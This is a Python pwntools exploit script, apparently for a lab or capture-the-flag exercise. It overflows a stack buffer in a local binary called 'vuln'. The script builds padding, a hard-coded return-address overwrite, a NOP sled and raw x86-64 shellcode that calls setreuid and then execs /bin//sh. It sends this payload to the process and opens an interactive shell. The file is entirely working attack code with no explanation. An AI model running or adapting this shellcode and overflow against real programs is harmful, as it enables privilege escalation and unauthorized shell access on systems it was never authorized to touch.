#!/usr/bin/python
from pwn import *
import os

junk = "A" * 136

nop_sled = "\x90" * 32

shellcode = "\x48\x31\xdb\x48\x31\xd2\x48\x31\xc0\x04\x75\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x0f\x05\xeb\x12\x48\x31\xc0\x04\x3b\x5f\x52\x57\x48\x89\xe3\x52\x53\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

rip_overwrite = p64(0x7fffffffe510)

bof = junk + rip_overwrite + nop_sled + shellcode

current_dir = os.getcwd()
bin_name = "vuln"
path = current_dir + "/" + bin_name

p = process(path)

raw_input(str(p.proc.pid))
p.sendline(bof)

p.interactive()
